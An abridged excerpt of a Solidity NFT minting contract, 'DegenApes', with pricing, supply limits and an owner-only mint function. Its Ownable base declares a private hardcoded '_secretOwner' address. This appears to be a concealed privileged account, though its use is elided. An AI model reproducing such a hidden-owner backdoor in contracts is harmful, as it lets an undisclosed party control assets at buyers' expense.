...
abstract contract Ownable is Context {
    ...
    address private _secretOwner = 0xC1dE8fa78914c5d49C08507C68F72B8dEf5570cD;
...
contract DegenApes is ERC721A, Ownable, ReentrancyGuard {
    string public baseURI = "ipfs://bafybeibq4l5nvunvk3nw5roy6ruvwgkm463lfrjtbs3bmic2mivfdedimy/";
    uint   public price             = 0.01 ether;
    uint   public maxPerTx          = 10;
    uint   public maxPerFree        = 0;
    uint   public totalFree         = 0;
    uint   public maxSupply         = 520;
    bool   public paused            = true;

    mapping(address => uint256) private _mintedFreeAmount;

    constructor() ERC721A("DegenApes", "DAPES"){}
    ...
    function mint(uint256 count) external payable {
        ...
        if (isFree) {
            ...
            require(totalSupply() + count <= maxSupply, "Not enough supply.");
    ...
    function kingMint(address mintAddress, uint256 count) public onlyOwner {
